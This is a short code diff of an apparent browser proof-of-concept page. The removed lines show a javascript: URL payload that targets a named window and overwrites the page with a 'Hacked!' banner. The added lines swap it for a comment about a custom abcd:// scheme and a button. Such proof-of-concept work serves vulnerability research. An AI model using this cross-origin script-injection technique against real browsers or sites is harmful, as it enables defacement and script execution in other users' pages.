@@ -1,9 +1,6 @@
 <script>
 function a(){
 	window.open("abcd://google.com", "x");
-	setTimeout(function(){
-		window.open("javascript://google.com/search?q=google.com&source=/%0adocument.body.innerHTML='%3ch1%20style=color:red%3eHacked!'", "x");
-	}, 111);
-}
+	//menggunakan scheme abcd://
 </script> 
-<center><img src="https://pwning.click/Genius_Cat.jpg" onclick="a()"></center>
+<button value="Go" onclick=javascript:a()>
